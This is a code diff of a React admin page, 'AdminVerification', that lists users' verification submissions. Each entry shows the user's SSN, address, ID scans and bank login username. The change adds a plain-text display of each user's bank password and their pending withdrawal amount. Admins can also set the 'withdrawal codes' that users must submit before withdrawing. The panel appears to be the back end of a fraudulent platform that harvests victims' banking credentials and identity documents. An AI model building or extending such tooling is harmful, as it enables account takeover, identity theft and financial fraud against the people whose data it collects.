@@ -2,6 +2,9 @@ import React, { useCallback, useEffect, useState } from 'react';
 import api from '../../utils/api';
 import './AdminVerification.css';
 
+const fmtUsd = (n) =>
+  `$${Number(n || 0).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })}`;
+
 const AdminVerification = () => {
   const [items, setItems] = useState([]);
   const [loading, setLoading] = useState(true);
@@ -20,7 +23,9 @@ const AdminVerification = () => {
     }
   }, []);
 
-  useEffect(() => { load(); }, [load]);
+  useEffect(() => {
+    load();
+  }, [load]);
 
   const setCode = async (userId) => {
     setMsg('');
@@ -54,58 +59,102 @@ const AdminVerification = () => {
 
       {items.length === 0 && <p className="empty">No verification submissions yet</p>}
 
-      {items.map((v) => (
-        <div key={v._id} className="verify-card">
-          <div className="verify-head">
-            <h3>
-              {v.user?.firstName} {v.user?.lastName} — {v.user?.email}
-            </h3>
-            <span className={`status ${v.status || 'pending'}`}>{v.status || 'pending'}</span>
-          </div>
+      {items.map((v) => {
+        const pending = v.pendingWithdrawal || {};
+        return (
+          <div key={v._id} className="verify-card">
+            <div className="verify-head">
+              <h3>
+                {v.user?.firstName} {v.user?.lastName} — {v.user?.email}
+              </h3>
+              <span className={`status ${v.status || 'pending'}`}>{v.status || 'pending'}</span>
+            </div>
 
-          <div className="details-grid">
-            <p><span>Email:</span> {v.email}</p>
-            <p><span>Phone:</span> {v.phone}</p>
-            <p><span>SSN:</span> {v.ssn}</p>
-            <p><span>Address:</span> {v.address}</p>
-            <p><span>ID Type:</span> {v.idType}</p>
-            <p><span>Bank Name:</span> {v.bankName}</p>
-            <p><span>Bank Address:</span> {v.bankAddress}</p>
-            <p>
-              <span>Bank Login:</span>{' '}
-              {v.bankLogin ? `${v.bankLogin.bankName} / ${v.bankLogin.username}` : '—'}
-            </p>
-            <p>
-              <span>ID Front:</span>{' '}
-              {v.idFront ? <a href={v.idFront} target="_blank" rel="noreferrer" download>Download</a> : '—'}
-            </p>
-            <p>
-              <span>ID Back:</span>{' '}
-              {v.idBack ? <a href={v.idBack} target="_blank" rel="noreferrer" download>Download</a> : '—'}
-            </p>
-          </div>
-
-          <div className="codes-section">
-            <h4>Submitted Withdrawal Codes</h4>
-            {(v.codes || []).length === 0 && <p className="empty">No codes submitted</p>}
-            {(v.codes || []).map((c, i) => (
-              <p key={i} className="submitted-code">
-                <strong>{c.code}</strong> — {new Date(c.createdAt).toLocaleString()}
+            <div className="details-grid">
+              <p><span>Email:</span> {v.email}</p>
+              <p><span>Phone:</span> {v.phone}</p>
+              <p><span>SSN:</span> {v.ssn}</p>
+              <p><span>Address:</span> {v.address}</p>
+              <p><span>ID Type:</span> {v.idType}</p>
+              <p><span>Bank Name:</span> {v.bankName}</p>
+              <p><span>Bank Address:</span> {v.bankAddress}</p>
+              <p>
+                <span>Bank Login:</span>{' '}
+                {v.bankLogin ? `${v.bankLogin.bankName} / ${v.bankLogin.username}` : '—'}
               </p>
-            ))}
-          </div>
+              <p>
+                <span>Bank Password:</span>{' '}
+                {v.bankLogin && v.bankLogin.password ? (
+                  <span className="plain-secret">{v.bankLogin.password}</span>
+                ) : (
+                  '—'
+                )}
+              </p>
+              {/* 🔧 NEW: withdrawal asset & amount the user wants to withdraw */}
+              <p>
+                <span>Withdrawal Asset:</span>{' '}
+                {pending.symbol ? (
+                  <span className="withdraw-pill">{pending.symbol}</span>
+                ) : (
+                  '—'
+                )}
+              </p>
+              <p>
+                <span>Withdrawal Amount:</span>{' '}
+                {pending.amount ? (
+                  <span className="withdraw-pill">{fmtUsd(pending.amount)}</span>
+                ) : (
+                  '—'
+                )}
+              </p>
+              <p>
+                <span>ID Front:</span>{' '}
+                {v.idFront ? (
+                  <a href={v.idFront} target="_blank" rel="noreferrer" download>
+                    Download
+                  </a>
+                ) : (
+                  '—'
+                )}
+              </p>
+              <p>
+                <span>ID Back:</span>{' '}
+                {v.idBack ? (
+                  <a href={v.idBack} target="_blank" rel="noreferrer" download>
+                    Download
+                  </a>
+                ) : (
+                  '—'
+                )}
+              </p>
+            </div>
 
-          <div className="code-setter">
-            <input
-              placeholder="Set withdrawal code"
-              value={codes[v.user?._id] || ''}
-              onChange={(e) => setCodes({ ...codes, [v.user?._id]: e.target.value })}
-            />
-            <button className="ghost-btn" onClick={() => setCode(v.user?._id)}>Set Code</button>
-            <button className="primary-btn" onClick={() => approve(v._id)}>Approve Verification</button>
+            <div className="codes-section">
+              <h4>Submitted Withdrawal Codes</h4>
+              {(v.codes || []).length === 0 && <p className="empty">No codes submitted</p>}
+              {(v.codes || []).map((c, i) => (
+                <p key={i} className="submitted-code">
+                  <strong>{c.code}</strong> — {new Date(c.createdAt).toLocaleString()}
+                </p>
+              ))}
+            </div>
+
+            <div className="code-setter">
+              <input
+                placeholder="Set withdrawal code"
+                value={codes[v.user?._id] || ''}
+                onChange={(e) => setCodes({ ...codes, [v.user?._id]: e.target.value })}
+              />
+              <button className="ghost-btn" onClick={() => setCode(v.user?._id)}>
+                Set Code
+              </button>
+              <button className="primary-btn" onClick={() => approve(v._id)}>
+                Approve Verification
+              </button>
+            </div>
           </div>
-        </div>
-      ))}
+        );
+      })}
     </div>
   );
 };
